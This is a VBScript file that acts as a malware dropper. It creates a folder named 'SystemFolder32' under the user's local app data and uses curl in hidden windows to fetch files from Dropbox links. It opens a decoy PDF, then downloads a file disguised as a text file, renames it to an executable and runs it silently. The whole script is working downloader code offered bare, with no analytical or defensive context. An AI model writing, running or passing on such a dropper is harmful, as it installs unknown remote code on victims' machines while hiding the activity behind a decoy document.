Option Explicit

Dim shell, fso
Dim url1, url2
Dim dirPath, pdfPath, txtPath, exePath
Dim cmd

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Paths
dirPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\SystemFolder32"
pdfPath = dirPath & "\4cqk7 ZgSZ.pdf"
txtPath = dirPath & "\4cqk7 ZgSZ.txt"
exePath = dirPath & "\4cqk7 ZgSZ.exe"

' Create directory if it doesn't exist
If Not fso.FolderExists(dirPath) Then
    fso.CreateFolder dirPath
End If

' -------- Download First File (PDF) --------
url1 = "https://www.dropbox.com/scl/fi/wu0mdxd864l74n46nzgac/document.pdf?rlkey=5dnnjnhh8gfw18zb9qdy7apab&st=hdyjtqyk&dl=1"

cmd = "cmd /c curl -L -o """ & pdfPath & """ """ & url1 & """"
shell.Run cmd, 0, True   ' 0 = hidden window, True = wait until finished

' Open PDF if it exists
If fso.FileExists(pdfPath) Then
    shell.Run """" & pdfPath & """", 0, False
End If

' -------- Download Second File --------
url2 = "https://www.dropbox.com/scl/fi/zhdbfx0j7sw20m0oqcc6b/three60cleaner.txt?rlkey=fzbflgoviqtki9kj49jvs9gte&st=ql5i4695&dl=1"

cmd = "cmd /c curl -L -o """ & txtPath & """ """ & url2 & """"
shell.Run cmd, 0, True

' Rename .txt to .exe
If fso.FileExists(txtPath) Then
    On Error Resume Next
    fso.MoveFile txtPath, exePath
    On Error GoTo 0
End If

' Run the EXE
If fso.FileExists(exePath) Then
    shell.Run """" & exePath & """", 0, False
End If

Set fso = Nothing
Set shell = Nothing